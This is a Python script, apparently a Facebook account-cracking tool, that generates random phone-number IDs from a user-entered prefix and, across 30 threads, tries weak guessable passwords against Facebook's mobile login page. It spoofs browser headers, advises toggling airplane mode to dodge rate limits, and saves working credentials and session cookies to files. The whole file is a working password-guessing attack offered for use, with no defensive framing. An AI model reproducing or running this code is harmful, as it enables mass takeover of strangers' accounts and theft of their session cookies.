import requests,re,os,random,time,sys,string
from concurrent.futures import ThreadPoolExecutor as tred
os.system('clear')
#==[color]=====#
R="\033[1;31m"  # Red
G="\033[1;32m"  # Green
W="\033[1;37m" # White
#===================#
loop=0
ok=0
cp=0
user=[]
def L3G3ND():
	print(35*'-')
	print(f'<{G}+{W}>{R}LEGEND IS BACK_YOOO{W}')
	print(f'<{G}+{W}>WHATSAPP : {G}01..7478901{W}')
	print(f'<{G}+{W}>GITHUB : {G}Legendhj{W}')
	print(f'<{G}+{W}>FACEBOOK : {G}Legends Aery Ace{W}')
	print(f"<{G}+{W}>YOUTUBE :{G} I DON'T HAVE THIS{W}")
	print(35*'-')	
	print(f"<{G}+{W}>{R}PLEASE ENTER YOUR CODE{W}")
	code=input(f'<{G}+{W}>Choose :{G} ')
	print(35*'-')
	print(f'<{G}+{W}>{R}PLEASE ENTER YOUR LIMIT{W}')
	limit=int(input(f'<{G}+{W}>Enter Limit :{G} '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(8))
		user.append(nmp)
	with tred(max_workers=30) as Zuyan:
		os.system('clear')
		print(35*f'{W}-')
		print(f'<{G}+{W}>{R}LEGEND IS BACK_YOOO{W}')
		print(f'<{G}+{W}>WHATSAPP : {G}01..7478901{W}')
		print(f'<{G}+{W}>GITHUB : {G}Legendhj{W}')
		print(f'<{G}+{W}>FACEBOOK : {G}Legends Aery Ace{W}')
		print(f"<{G}+{W}>YOUTUBE :{G} I DON'T HAVE THIS{W}")
		print(35*'-')
		print(f'<{G}+{W}>WAITING FOR OK IDS')
		print(f'<{G}+{W}>USE AIRPLANE MODE [ON/OFF]')
		print(f'<{G}+{W}>YOUR CRACK LIMIT : {G}{str(len(user))}{W}')
		print(35*'-')
		for sex in user:
			uid = code+sex
			pwx = [sex,uid,uid[:8],uid[:7],uid[:6],uid[4:],uid[5:],'i love you','sadiya']
			Zuyan.submit(rcrack,uid,pwx)
			
def rcrack(uid,pwx):
    global loop
    global ok
    global cp
    try:
        for ps in pwx:
            sys.stdout.write(f'\r{W}[{G}WAITING{W}] [{G}{loop}{W}] [{G}OK•{G}{ok}{W}|{R}CP•{cp}{W}] ')
            sys.stdout.flush()        
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": ps,
                "login": "Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
			'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"Redmi Y3"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8', data=log_data, headers=header_freefb).text
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                c_userx = session.cookies.get_dict()['c_user']
                print(f'\r\033[1;32m[OK_🍁] {c_userx} | {ps} ')
                print(f'\r\033[1;32mCookie= {coki} ')
                with open('/sdcard/OK.txt', 'a') as f:
                    f.write(f'{uid} | {ps} | \n Cookes : {coki}\n')
                ok+=1
                break
            elif 'checkpoint' in log_cookies:
                print(f'\r\033[1;30m[OOPS] {uid} | {ps}\r')
                with open('/sdcard/CP.txt', 'a') as f:
                    f.write(f'{uid} | {ps}\n')
                cp+=1
                break
            else:
                continue   
        loop += 1
    except:
        pass		
			
L3G3ND()